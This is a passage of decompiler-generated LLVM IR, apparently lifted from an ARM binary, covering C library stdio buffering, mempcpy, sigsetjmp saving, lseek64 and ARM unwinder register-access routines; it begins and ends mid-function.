  %v0_17e38.in = phi i32 [ %v5_17e50, %dec_label_pc_17edcthread-pre-split.dec_label_pc_17e34_crit_edge ], [ %arg3, %entry ]
  %v3_17e38 = phi i32 [ %v5_17e50, %dec_label_pc_17edcthread-pre-split.dec_label_pc_17e34_crit_edge ], [ %arg3, %entry ]
  %v0_17e38 = icmp slt i32 %v0_17e38.in, 0
  %storemerge = select i1 %v0_17e38, i32 %v3_17e34, i32 %v3_17e38
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_17e3c, i32* %r1.global-to-local, align 4
  %v1_17e40 = add i32 %v0_17e40, 4
  %v2_17e40 = inttoptr i32 %v1_17e40 to i32*
  %v3_17e40 = load i32, i32* %v2_17e40, align 4
  %v3_17e44 = call i32 @__GI___libc_write(i32 %v3_17e40, i32 %v0_17e3c)
  %v1_17e48 = icmp slt i32 %v3_17e44, 0
  %v2_17e48 = icmp eq i32 %v3_17e44, 0
  store i1 %v2_17e48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17e48, label %dec_label_pc_17e58, label %dec_label_pc_17edcthread-pre-split

dec_label_pc_17e58:                               ; preds = %dec_label_pc_17e34
  %v0_17e58 = load i32, i32* @r4, align 4
  %v1_17e58 = inttoptr i32 %v0_17e58 to i16*
  %v2_17e58 = load i16, i16* %v1_17e58, align 2
  %v1_17e5c = or i16 %v2_17e58, 8
  store i16 %v1_17e5c, i16* %v1_17e58, align 2
  store i32 40692, i32* %r3.global-to-local, align 4
  %v0_17e68 = call i32 @__aeabi_read_tp()
  %v3_17e6c = load i16, i16* @global_var_21d68.334, align 2
  %v4_17e6c = sext i16 %v3_17e6c to i32
  store i32 %v4_17e6c, i32* %r3.global-to-local, align 4
  %v2_17e70 = add i32 %v4_17e6c, %v0_17e68
  %v3_17e70 = inttoptr i32 %v2_17e70 to i32*
  %v4_17e70 = load i32, i32* %v3_17e70, align 4
  store i32 %v4_17e70, i32* %r3.global-to-local, align 4
  %v7_17e74 = icmp eq i32 %v4_17e70, 4
  store i1 %v7_17e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17e74, label %dec_label_pc_17e80, label %bb21

bb21:                                             ; preds = %dec_label_pc_17e58
  %v8_17e78 = icmp eq i32 %v4_17e70, 11
  store i1 %v8_17e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17e78, label %dec_label_pc_17e80, label %dec_label_pc_17ee4

dec_label_pc_17e80:                               ; preds = %dec_label_pc_17e58, %bb21
  %v0_17e80 = load i32, i32* @r4, align 4
  %v1_17e80 = add i32 %v0_17e80, 8
  store i32 %v1_17e80, i32* %r2.global-to-local, align 4
  %v1_17e84 = inttoptr i32 %v1_17e80 to i32*
  %v2_17e84 = load i32, i32* %v1_17e84, align 4
  store i32 %v2_17e84, i32* %r2.global-to-local, align 4
  %v3_17e84 = add i32 %v0_17e80, 12
  %v4_17e84 = inttoptr i32 %v3_17e84 to i32*
  %v5_17e84 = load i32, i32* %v4_17e84, align 4
  store i32 %v5_17e84, i32* %r3.global-to-local, align 4
  %v2_17e88 = sub i32 %v5_17e84, %v2_17e84
  store i32 %v2_17e88, i32* %r1.global-to-local, align 4
  %v9_17e88 = icmp eq i32 %v5_17e84, %v2_17e84
  store i1 %v9_17e88, i1* %cpsr_z.global-to-local, align 1
  %v0_17ed4.pre = load i32, i32* @r5, align 4
  br i1 %v9_17e88, label %dec_label_pc_17ed4, label %dec_label_pc_17e90

dec_label_pc_17e90:                               ; preds = %dec_label_pc_17e80
  %v3_17e90 = icmp ult i32 %v2_17e88, %v0_17ed4.pre
  %v9_17e90 = icmp eq i32 %v2_17e88, %v0_17ed4.pre
  store i1 %v9_17e90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17e90, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_17e90
  store i32 %v0_17ed4.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17e90, %bb22, %dec_label_pc_17eb8
  %v2_17ea4 = phi i32 [ %v1_17ebc, %dec_label_pc_17eb8 ], [ %v2_17e84, %bb22 ], [ %v2_17e84, %dec_label_pc_17e90 ]
  %v0_17e98 = load i32, i32* @r6, align 4
  %v1_17e98 = inttoptr i32 %v0_17e98 to i8*
  %v2_17e98 = load i8, i8* %v1_17e98, align 1
  %v3_17e98 = zext i8 %v2_17e98 to i32
  store i32 %v3_17e98, i32* %r3.global-to-local, align 4
  %v7_17e9c = icmp eq i8 %v2_17e98, 10
  store i1 %v7_17e9c, i1* %cpsr_z.global-to-local, align 1
  %v1_17ea0 = add i32 %v0_17e98, 1
  store i32 %v1_17ea0, i32* @r6, align 4
  %v3_17ea4 = inttoptr i32 %v2_17ea4 to i8*
  store i8 %v2_17e98, i8* %v3_17ea4, align 1
  %v0_17ea8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17ea8, label %dec_label_pc_17eac, label %dec_label_pc_17eb8

dec_label_pc_17eac:                               ; preds = %.preheader
  %v0_17eac = load i32, i32* @r4, align 4
  %v1_17eac = inttoptr i32 %v0_17eac to i16*
  %v2_17eac = load i16, i16* %v1_17eac, align 2
  %v3_17eac = zext i16 %v2_17eac to i32
  store i32 %v3_17eac, i32* %r3.global-to-local, align 4
  %v1_17eb0 = and i32 %v3_17eac, 256
  %v2_17eb0 = icmp eq i32 %v1_17eb0, 0
  store i1 %v2_17eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17eb0, label %dec_label_pc_17eb8, label %dec_label_pc_17eac.dec_label_pc_17ec4_crit_edge

dec_label_pc_17eac.dec_label_pc_17ec4_crit_edge:  ; preds = %dec_label_pc_17eac
  %v0_17ec8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17ec4

dec_label_pc_17eb8:                               ; preds = %dec_label_pc_17eac, %.preheader
  %v0_17eb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17eb8 = add i32 %v0_17eb8, -1
  store i32 %v1_17eb8, i32* %r1.global-to-local, align 4
  %v7_17eb8 = icmp eq i32 %v0_17eb8, 1
  store i1 %v7_17eb8, i1* %cpsr_z.global-to-local, align 1
  %v0_17ebc = load i32, i32* %r2.global-to-local, align 4
  %v1_17ebc = add i32 %v0_17ebc, 1
  store i32 %v1_17ebc, i32* %r2.global-to-local, align 4
  br i1 %v7_17eb8, label %dec_label_pc_17eb8.dec_label_pc_17ec4_crit_edge, label %.preheader

dec_label_pc_17eb8.dec_label_pc_17ec4_crit_edge:  ; preds = %dec_label_pc_17eb8
  %v0_17ec4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17ec4

dec_label_pc_17ec4:                               ; preds = %dec_label_pc_17eac.dec_label_pc_17ec4_crit_edge, %dec_label_pc_17eb8.dec_label_pc_17ec4_crit_edge
  %v0_17ec8 = phi i32 [ %v1_17ebc, %dec_label_pc_17eb8.dec_label_pc_17ec4_crit_edge ], [ %v0_17ec8.pre, %dec_label_pc_17eac.dec_label_pc_17ec4_crit_edge ]
  %v0_17ec4 = phi i32 [ %v0_17ec4.pre, %dec_label_pc_17eb8.dec_label_pc_17ec4_crit_edge ], [ %v0_17eac, %dec_label_pc_17eac.dec_label_pc_17ec4_crit_edge ]
  %v1_17ec4 = add i32 %v0_17ec4, 8
  %v2_17ec4 = inttoptr i32 %v1_17ec4 to i32*
  %v3_17ec4 = load i32, i32* %v2_17ec4, align 4
  store i32 %v3_17ec4, i32* %r3.global-to-local, align 4
  %v2_17ec8 = add i32 %v0_17ec4, 16
  %v3_17ec8 = inttoptr i32 %v2_17ec8 to i32*
  store i32 %v0_17ec8, i32* %v3_17ec8, align 4
  %v0_17ecc = load i32, i32* %r3.global-to-local, align 4
  %v1_17ecc = load i32, i32* %r2.global-to-local, align 4
  %v2_17ecc = sub i32 %v1_17ecc, %v0_17ecc
  store i32 %v2_17ecc, i32* %r3.global-to-local, align 4
  %v1_17ed0 = load i32, i32* @r5, align 4
  %v2_17ed0 = sub i32 %v1_17ed0, %v2_17ecc
  br label %dec_label_pc_17ed4

dec_label_pc_17ed4:                               ; preds = %dec_label_pc_17e80, %dec_label_pc_17ec4
  %v0_17ed4 = phi i32 [ %v2_17ed0, %dec_label_pc_17ec4 ], [ %v0_17ed4.pre, %dec_label_pc_17e80 ]
  %v1_17ed4 = load i32, i32* @r7, align 4
  %v2_17ed4 = sub i32 %v1_17ed4, %v0_17ed4
  store i32 %v2_17ed4, i32* @r7, align 4
  br label %dec_label_pc_17ee4

dec_label_pc_17edcthread-pre-split:               ; preds = %dec_label_pc_17e34
  %v3_17e4c = load i32, i32* @r6, align 4
  %v5_17e4c = add i32 %v3_17e4c, %v3_17e44
  store i32 %v5_17e4c, i32* @r6, align 4
  %v4_17e50 = load i32, i32* @r5, align 4
  %v5_17e50 = sub i32 %v4_17e50, %v3_17e44
  store i32 %v5_17e50, i32* @r5, align 4
  %v2_17edc = icmp eq i32 %v5_17e50, 0
  store i1 %v2_17edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17edc, label %dec_label_pc_17ee4, label %dec_label_pc_17edcthread-pre-split.dec_label_pc_17e34_crit_edge

dec_label_pc_17edcthread-pre-split.dec_label_pc_17e34_crit_edge: ; preds = %dec_label_pc_17edcthread-pre-split
  %v3_17e34.pre = load i32, i32* @r8, align 4
  %v0_17e40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17e34

dec_label_pc_17ee4:                               ; preds = %dec_label_pc_17edcthread-pre-split, %entry, %bb21, %dec_label_pc_17ed4
  %v0_17ee4 = load i32, i32* @r7, align 4
  ret i32 %v0_17ee4

; uselistorder directives
  uselistorder i32 %v5_17e50, { 1, 3, 0, 2 }
  uselistorder i32 %v5_17e4c, { 1, 0 }
  uselistorder i32 %v0_17ec4, { 1, 0 }
  uselistorder i32 %v1_17ebc, { 0, 2, 1 }
  uselistorder i32 %v0_17eb8, { 1, 0 }
  uselistorder i32 %v0_17ed4.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_17e84, { 1, 0, 2 }
  uselistorder i32 %v2_17e84, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_17e44, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17e3c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 11, 8, 9, 10, 17, 24, 25, 3, 4, 5, 12, 13, 14, 0, 15, 16, 18, 19, 6, 20, 7, 21, 1, 22, 2, 23, 26 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_17ee4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_17ed4, { 1, 0 }
  uselistorder label %dec_label_pc_17ec4, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17e80, { 1, 0 }
  uselistorder label %dec_label_pc_17e34, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17ef4 = load i32, i32* @r4, align 4
  store i32 %v3_17ef4, i32* %stack_var_-8, align 4
  %v1_17ef8 = add i32 %arg1, 8
  %v1_17efc = inttoptr i32 %v1_17ef8 to i32*
  %v2_17efc = load i32, i32* %v1_17efc, align 4
  store i32 %v2_17efc, i32* @r1, align 4
  %v3_17efc = add i32 %arg1, 12
  %v4_17efc = inttoptr i32 %v3_17efc to i32*
  %v5_17efc = load i32, i32* %v4_17efc, align 4
  %v2_17f00 = sub i32 %v5_17efc, %v2_17efc
  store i32 %v2_17f00, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_17f08 = inttoptr i32 %arg1 to i16*
  %v4_17f08 = call i32 @__stdio_READ(i16* %v3_17f08, i32 %v2_17efc, i32 %v2_17f00)
  %v0_17f0c = load i32, i32* @r4, align 4
  %v1_17f0c = add i32 %v0_17f0c, 8
  %v2_17f0c = inttoptr i32 %v1_17f0c to i32*
  %v3_17f0c = load i32, i32* %v2_17f0c, align 4
  store i32 %v3_17f0c, i32* %r2.global-to-local, align 4
  %v2_17f10 = add i32 %v3_17f0c, %v4_17f08
  %v2_17f14 = add i32 %v0_17f0c, 20
  %v3_17f14 = inttoptr i32 %v2_17f14 to i32*
  store i32 %v2_17f10, i32* %v3_17f14, align 4
  %v0_17f18 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f18 = load i32, i32* @r4, align 4
  %v2_17f18 = add i32 %v1_17f18, 16
  %v3_17f18 = inttoptr i32 %v2_17f18 to i32*
  store i32 %v0_17f18, i32* %v3_17f18, align 4
  %v2_17f1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17f1c, i32* @r4, align 4
  ret i32 %v4_17f08

; uselistorder directives
  uselistorder i32 %v4_17f08, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17f24 = load i32, i32* @r4, align 4
  store i32 %v3_17f24, i32* %stack_var_-12, align 4
  %v0_17f28 = load i32, i32* @r0, align 4
  %v1_17f28 = inttoptr i32 %v0_17f28 to i16*
  %v2_17f28 = load i16, i16* %v1_17f28, align 2
  %v3_17f28 = zext i16 %v2_17f28 to i32
  store i32 %v3_17f28, i32* %r3.global-to-local, align 4
  %v0_17f2c = load i32, i32* @r1, align 4
  %v2_17f2c = and i32 %v0_17f2c, %v3_17f28
  %v4_17f2c = icmp eq i32 %v2_17f2c, 0
  store i32 %v0_17f28, i32* @r4, align 4
  br i1 %v4_17f2c, label %dec_label_pc_17f3c, label %dec_label_pc_17f4c

dec_label_pc_17f3c:                               ; preds = %entry
  %v1_17f3c = and i32 %v3_17f28, 2176
  %v2_17f3c = icmp eq i32 %v1_17f3c, 0
  br i1 %v2_17f3c, label %dec_label_pc_17f44, label %dec_label_pc_17f58

dec_label_pc_17f44:                               ; preds = %dec_label_pc_17f3c
  %v2_17f44 = or i32 %v0_17f2c, %v3_17f28
  store i32 %v2_17f44, i32* %r3.global-to-local, align 4
  %v1_17f48 = trunc i32 %v2_17f44 to i16
  store i16 %v1_17f48, i16* %v1_17f28, align 2
  %v0_17f4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17f4c

dec_label_pc_17f4c:                               ; preds = %entry, %dec_label_pc_17f44
  %v0_17f4c = phi i32 [ %v0_17f28, %entry ], [ %v0_17f4c.pre, %dec_label_pc_17f44 ]
  %v1_17f4c = inttoptr i32 %v0_17f4c to i16*
  %v2_17f4c = load i16, i16* %v1_17f4c, align 2
  %v3_17f4c = zext i16 %v2_17f4c to i32
  store i32 %v3_17f4c, i32* %r3.global-to-local, align 4
  %v1_17f50 = and i32 %v3_17f4c, 16
  store i32 %v1_17f50, i32* %r5.global-to-local, align 4
  %v2_17f50 = icmp eq i32 %v1_17f50, 0
  br i1 %v2_17f50, label %dec_label_pc_17f80, label %dec_label_pc_17f58

dec_label_pc_17f58:                               ; preds = %dec_label_pc_17f3c, %dec_label_pc_17f4c
  store i32 40448, i32* %r3.global-to-local, align 4
  %v0_17f5c = call i32 @__aeabi_read_tp()
  store i32 %v0_17f5c, i32* %r0.global-to-local, align 4
  %v3_17f60 = load i16, i16* @global_var_21d68.334, align 2
  %v4_17f60 = sext i16 %v3_17f60 to i32
  store i32 %v4_17f60, i32* %r3.global-to-local, align 4
  %v3_17f68 = add i32 %v4_17f60, %v0_17f5c
  %v4_17f68 = inttoptr i32 %v3_17f68 to i32*
  store i32 9, i32* %v4_17f68, align 4
  br label %dec_label_pc_17f6c

dec_label_pc_17f6c:                               ; preds = %dec_label_pc_17f88, %dec_label_pc_17f58
  %v0_17f6c = load i32, i32* @r4, align 4
  %v1_17f6c = inttoptr i32 %v0_17f6c to i16*
  %v2_17f6c = load i16, i16* %v1_17f6c, align 2
  %v3_17f6c = zext i16 %v2_17f6c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_17f74 = or i32 %v3_17f6c, 8
  store i32 %v1_17f74, i32* %r3.global-to-local, align 4
  %v1_17f78 = trunc i32 %v1_17f74 to i16
  store i16 %v1_17f78, i16* %v1_17f6c, align 2
  %v1_17fc0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17fb8

dec_label_pc_17f80:                               ; preds = %dec_label_pc_17f4c
  %v1_17f80 = and i32 %v3_17f4c, 64
  %v2_17f80 = icmp eq i32 %v1_17f80, 0
  br i1 %v2_17f80, label %dec_label_pc_17fa8, label %dec_label_pc_17f88

dec_label_pc_17f88:                               ; preds = %dec_label_pc_17f80
  %v0_17f88 = load i32, i32* @r0, align 4
  %v1_17f88 = call i32 @__stdio_wcommit(i32 %v0_17f88)
  store i32 %v1_17f88, i32* %r0.global-to-local, align 4
  %v2_17f8c = icmp eq i32 %v1_17f88, 0
  br i1 %v2_17f8c, label %dec_label_pc_17f94, label %dec_label_pc_17f6c

dec_label_pc_17f94:                               ; preds = %dec_label_pc_17f88
  %v0_17f94 = load i32, i32* @r4, align 4
  %v1_17f94 = inttoptr i32 %v0_17f94 to i16*
  %v2_17f94 = load i16, i16* %v1_17f94, align 2
  %v3_17f94 = zext i16 %v2_17f94 to i32
  store i32 %v3_17f94, i32* %r3.global-to-local, align 4
  %v1_17f98 = add i32 %v0_17f94, 8
  %v2_17f98 = inttoptr i32 %v1_17f98 to i32*
  %v3_17f98 = load i32, i32* %v2_17f98, align 4
  %v1_17f9c = and i32 %v3_17f94, 65471
  store i32 %v1_17f9c, i32* %r3.global-to-local, align 4
  %v2_17fa0 = add i32 %v0_17f94, 28
  %v3_17fa0 = inttoptr i32 %v2_17fa0 to i32*
  store i32 %v3_17f98, i32* %v3_17fa0, align 4
  %v0_17fa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_17fa4 = trunc i32 %v0_17fa4 to i16
  %v2_17fa4 = load i32, i32* @r4, align 4
  %v3_17fa4 = inttoptr i32 %v2_17fa4 to i16*
  store i16 %v1_17fa4, i16* %v3_17fa4, align 2
  %v0_17fa8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17fa8

dec_label_pc_17fa8:                               ; preds = %dec_label_pc_17f80, %dec_label_pc_17f94
  %v2_17fb0 = phi i32 [ %v0_17f4c, %dec_label_pc_17f80 ], [ %v0_17fa8.pre, %dec_label_pc_17f94 ]
  %v1_17fa8 = inttoptr i32 %v2_17fb0 to i16*
  %v2_17fa8 = load i16, i16* %v1_17fa8, align 2
  %v3_17fa8 = zext i16 %v2_17fa8 to i32
  %v1_17fac = or i32 %v3_17fa8, 1
  store i32 %v1_17fac, i32* %r3.global-to-local, align 4
  %v1_17fb0 = trunc i32 %v1_17fac to i16
  store i16 %v1_17fb0, i16* %v1_17fa8, align 2
  %v0_17fb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17fb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17fb8

dec_label_pc_17fb8:                               ; preds = %dec_label_pc_17f6c, %dec_label_pc_17fa8
  %v1_17fc0 = phi i32 [ %v1_17fc0.pre, %dec_label_pc_17f6c ], [ %v0_17fb4, %dec_label_pc_17fa8 ]
  %v2_17fbc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17fbc, i32* @r4, align 4
  ret i32 %v1_17fc0

; uselistorder directives
  uselistorder i32 %v3_17f28, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17fb8, { 1, 0 }
  uselistorder label %dec_label_pc_17fa8, { 1, 0 }
  uselistorder label %dec_label_pc_17f58, { 1, 0 }
  uselistorder label %dec_label_pc_17f4c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_17fc8 = load i32, i32* @r4, align 4
  %v6_17fc8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17fd8 = call i32 @memcpy()
  %v0_17fdc = load i32, i32* @r5, align 4
  %v1_17fdc = load i32, i32* @r4, align 4
  %v2_17fdc = add i32 %v1_17fdc, %v0_17fdc
  store i32 %v3_17fc8, i32* @r4, align 4
  store i32 %v6_17fc8, i32* @r5, align 4
  ret i32 %v2_17fdc
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_17fec = load i32, i32* @r1, align 4
  %v2_17fec = icmp eq i32 %v0_17fec, 0
  %v3_17ff0 = load i32, i32* @r4, align 4
  store i32 %v3_17ff0, i32* %stack_var_-8, align 4
  %v0_17ff4 = load i32, i32* @r0, align 4
  store i32 %v0_17ff4, i32* %r4.global-to-local, align 4
  br i1 %v2_17fec, label %dec_label_pc_18018, label %dec_label_pc_17ffc

dec_label_pc_17ffc:                               ; preds = %entry
  %v1_18004 = add i32 %v0_17ff4, 260
  %v4_18008 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_18004)
  %v2_1800c = icmp eq i32 %v4_18008, 0
  br i1 %v2_1800c, label %dec_label_pc_1801c, label %dec_label_pc_18018

dec_label_pc_18018:                               ; preds = %dec_label_pc_17ffc, %entry
  br label %dec_label_pc_1801c

dec_label_pc_1801c:                               ; preds = %dec_label_pc_17ffc, %dec_label_pc_18018
  %storemerge = phi i32 [ 0, %dec_label_pc_18018 ], [ 1, %dec_label_pc_17ffc ]
  %v1_18020 = load i32, i32* %r4.global-to-local, align 4
  %v2_18020 = add i32 %v1_18020, 256
  %v3_18020 = inttoptr i32 %v2_18020 to i32*
  store i32 %storemerge, i32* %v3_18020, align 4
  %v2_18024 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18024, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 3, 26, 4, 27 }
  uselistorder i32 260, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1801c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_18074, label %dec_label_pc_18058

dec_label_pc_18058:                               ; preds = %entry
  %v0_1805c = call i32 @__aeabi_read_tp()
  %v3_18060 = load i16, i16* @global_var_21d68.334, align 2
  %v4_18060 = sext i16 %v3_18060 to i32
  %v0_18064 = load i32, i32* %r2.global-to-local, align 4
  %v1_18064 = sub i32 0, %v0_18064
  store i32 %v1_18064, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1806c = add i32 %v4_18060, %v0_1805c
  %v4_1806c = inttoptr i32 %v3_1806c to i32*
  store i32 %v1_18064, i32* %v4_1806c, align 4
  %v0_1807c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1807c

dec_label_pc_18074:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_18074 = icmp eq i32 %arg1, 0
  br i1 %v2_18074, label %dec_label_pc_18088, label %dec_label_pc_1807c

dec_label_pc_1807c:                               ; preds = %dec_label_pc_18074, %dec_label_pc_18058
  %v0_1807c = phi i32 [ %arg1, %dec_label_pc_18074 ], [ %v0_1807c.pre, %dec_label_pc_18058 ]
  %v3_18080 = ashr i32 %v0_1807c, 31
  br label %dec_label_pc_1808c

dec_label_pc_18088:                               ; preds = %dec_label_pc_18074
  br label %dec_label_pc_1808c

dec_label_pc_1808c:                               ; preds = %dec_label_pc_1807c, %dec_label_pc_18088
  %v1_18094 = phi i32 [ %v0_1807c, %dec_label_pc_1807c ], [ %tmp8, %dec_label_pc_18088 ]
  %storemerge = phi i32 [ %v3_18080, %dec_label_pc_1807c ], [ %tmp, %dec_label_pc_18088 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_18094

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 5, 2, 3, 4, 6, 7, 0, 1 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_21d68.334, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 64, 70, 69, 63, 62, 79, 78, 67, 68, 66, 65, 77, 76, 75, 74, 73, 72, 71, 18, 26, 28, 34, 61, 43, 42, 12, 6, 5, 11, 25, 24, 10, 3, 2, 13, 9, 8, 7, 47, 15, 23, 46, 45, 27, 20, 22, 21, 58, 57, 31, 30, 29, 32, 33, 56, 44, 55, 54, 17, 16, 53, 19, 60, 59, 41, 38, 37, 36, 4, 52, 51, 35, 50, 14, 49, 48, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1808c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1809c = icmp eq i32 %regclass, 0
  br i1 %v2_1809c, label %dec_label_pc_180a4, label %dec_label_pc_180d4

dec_label_pc_180a4:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_180a4
  %v6_180a8 = icmp eq i32 %representation, 0
  br i1 %v6_180a8, label %dec_label_pc_180b8, label %bb8

.thread3:                                         ; preds = %dec_label_pc_180a4
  br label %dec_label_pc_180e0

bb8:                                              ; preds = %bb
  br label %dec_label_pc_180e0

dec_label_pc_180b8:                               ; preds = %bb
  %v3_180b8 = mul i32 %regno, 4
  %v2_180bc = add i32 %v3_180b8, %context
  %v1_180c0 = add i32 %v2_180bc, 4
  %v2_180c0 = inttoptr i32 %v1_180c0 to i32*
  %v3_180c0 = load i32, i32* %v2_180c0, align 4
  %v2_180cc = bitcast i8* %valuep to i32*
  store i32 %v3_180c0, i32* %v2_180cc, align 4
  ret i32 0

dec_label_pc_180d4:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_180d4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_180d4, %bb9
  %v0_180dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_180dc)
  br label %dec_label_pc_180e0

dec_label_pc_180e0:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_180e0, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_180e8 = icmp eq i32 %regclass, 0
  br i1 %v2_180e8, label %dec_label_pc_180f0, label %dec_label_pc_18120

dec_label_pc_180f0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_180f0
  %v6_180f4 = icmp eq i32 %representation, 0
  br i1 %v6_180f4, label %dec_label_pc_18104, label %bb8

.thread3:                                         ; preds = %dec_label_pc_180f0
  br label %dec_label_pc_1812c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1812c

dec_label_pc_18104:                               ; preds = %bb
  %v3_18108 = mul i32 %regno, 4
  %v1_1810c = bitcast i8* %valuep to i32*
  %v2_1810c = load i32, i32* %v1_1810c, align 4
  %v2_18110 = add i32 %v3_18108, %context
  %v2_18118 = add i32 %v2_18110, 4
